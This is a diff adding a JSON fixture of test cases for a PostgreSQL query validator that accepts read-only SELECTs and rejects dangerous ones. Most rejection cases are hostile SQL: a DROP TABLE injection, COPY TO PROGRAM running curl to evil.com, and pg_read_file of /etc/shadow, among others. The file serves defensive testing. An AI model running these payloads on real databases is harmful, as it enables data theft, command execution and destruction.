@@ -1,0 +1,103 @@
+[
+  {
+    "id": "PG-01",
+    "description": "Standard SELECT with double-quoted table and columns",
+    "sql": "SELECT \"id\", \"name\", \"email\" FROM \"customers\"",
+    "expectedValid": true
+  },
+  {
+    "id": "PG-02",
+    "description": "Standard aggregation and date range filtering",
+    "sql": "SELECT COUNT(*) AS total_orders, SUM(\"total\") AS total_revenue FROM \"orders\" WHERE \"order_date\" >= '2024-01-01' AND \"order_date\" < '2025-01-01'",
+    "expectedValid": true
+  },
+  {
+    "id": "PG-03",
+    "description": "Allowed Postgres date truncation DATE_TRUNC",
+    "sql": "SELECT DATE_TRUNC('month', \"order_date\") AS order_month, COUNT(*) AS count FROM \"orders\" GROUP BY DATE_TRUNC('month', \"order_date\")",
+    "expectedValid": true
+  },
+  {
+    "id": "PG-04",
+    "description": "Allowed Postgres numeric formatting and aggregation ROUND(AVG)",
+    "sql": "SELECT ROUND(AVG(\"total\"), 2) AS avg_total FROM \"orders\"",
+    "expectedValid": true
+  },
+  {
+    "id": "PG-05",
+    "description": "Strict rejection of multi-statement injection",
+    "sql": "SELECT * FROM \"customers\"; DROP TABLE \"customers\"",
+    "expectedValid": false,
+    "expectedReasonPrefix": "ast_multiple_statements_disallowed"
+  },
+  {
+    "id": "PG-06",
+    "description": "Strict rejection of COPY statement",
+    "sql": "COPY \"customers\" TO '/tmp/data.csv'",
+    "expectedValid": false,
+    "expectedReasonPrefix": "ast_disallowed_statement_type:copy"
+  },
+  {
+    "id": "PG-07",
+    "description": "Strict rejection of COPY ... TO/FROM PROGRAM dangerous shell execution vector",
+    "sql": "COPY \"customers\" TO PROGRAM 'curl http://evil.com/leak'",
+    "expectedValid": false,
+    "expectedReasonPrefix": "ast_disallowed_clause:copy_program"
+  },
+  {
+    "id": "PG-08",
+    "description": "Strict rejection of large object export function lo_export",
+    "sql": "SELECT lo_export(12345, '/tmp/dump.bin') FROM \"customers\"",
+    "expectedValid": false,
+    "expectedReasonPrefix": "ast_disallowed_function:large_object"
+  },
+  {
+    "id": "PG-09",
+    "description": "Strict rejection of large object import function lo_import",
+    "sql": "SELECT lo_import('/etc/passwd') FROM \"customers\"",
+    "expectedValid": false,
+    "expectedReasonPrefix": "ast_disallowed_function:large_object"
+  },
+  {
+    "id": "PG-10",
+    "description": "Strict rejection of server file access function pg_read_file",
+    "sql": "SELECT pg_read_file('/etc/shadow') FROM \"customers\"",
+    "expectedValid": false,
+    "expectedReasonPrefix": "ast_disallowed_function:server_file_access"
+  },
+  {
+    "id": "PG-11",
+    "description": "Strict rejection of server file write function pg_write_file",
+    "sql": "SELECT pg_write_file('/tmp/owned.txt', 'evil') FROM \"customers\"",
+    "expectedValid": false,
+    "expectedReasonPrefix": "ast_disallowed_function:server_file_access"
+  },
+  {
+    "id": "PG-12",
+    "description": "Strict rejection of cross-database dblink vector",
+    "sql": "SELECT * FROM dblink('dbname=remote host=10.0.0.1', 'SELECT 1') AS t(id int)",
+    "expectedValid": false,
+    "expectedReasonPrefix": "ast_disallowed_function:cross_database_link"
+  },
+  {
+    "id": "PG-13",
+    "description": "Strict rejection of DDL DROP statement",
+    "sql": "DROP TABLE \"customers\"",
+    "expectedValid": false,
+    "expectedReasonPrefix": "ast_disallowed_statement_type"
+  },
+  {
+    "id": "PG-14",
+    "description": "Strict rejection of DML INSERT statement",
+    "sql": "INSERT INTO \"customers\" (\"name\") VALUES ('Attacker')",
+    "expectedValid": false,
+    "expectedReasonPrefix": "ast_disallowed_statement_type"
+  },
+  {
+    "id": "PG-15",
+    "description": "Strict rejection of DML UPDATE statement",
+    "sql": "UPDATE \"customers\" SET \"name\" = 'Compromised'",
+    "expectedValid": false,
+    "expectedReasonPrefix": "ast_disallowed_statement_type"
+  }
+]
